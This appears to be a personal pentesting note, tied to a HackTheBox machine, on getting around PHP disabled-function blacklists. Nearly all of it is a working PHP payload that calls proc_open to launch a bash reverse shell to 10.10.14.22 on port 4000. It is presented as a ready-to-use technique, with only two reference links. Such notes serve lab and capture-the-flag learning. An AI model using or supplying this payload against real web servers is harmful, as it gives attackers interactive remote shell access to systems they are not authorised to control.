---
title: "Bypass Php Functions Blacklist (Web)"
category: "web"
type: "technique"
tags: ["my-notes", "personal", "bypass", "php", "functions", "blacklist", "web"]
summary: "https://ir0nstone.gitbook.io/hackthebox/linux/medium/updown"
source:
  name: "Personal notes"
origin_path: "Web/bypass php functions blacklist.md"
---

```php
<?php
        $descriptor_spec = array(
                0 => array("pipe", "r"),
                1 => array("pipe", "w"),
                2 => array("pipe", "w")
        );
        $cmd = "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.22/4000 0>&1'";
        
        proc_open($cmd, $descriptor_spec, $pipes);
?>
```

# Reference
https://ir0nstone.gitbook.io/hackthebox/linux/medium/updown
https://github.com/teambi0s/dfunc-bypasser

---

*From your own notes: `Web/bypass php functions blacklist.md`*
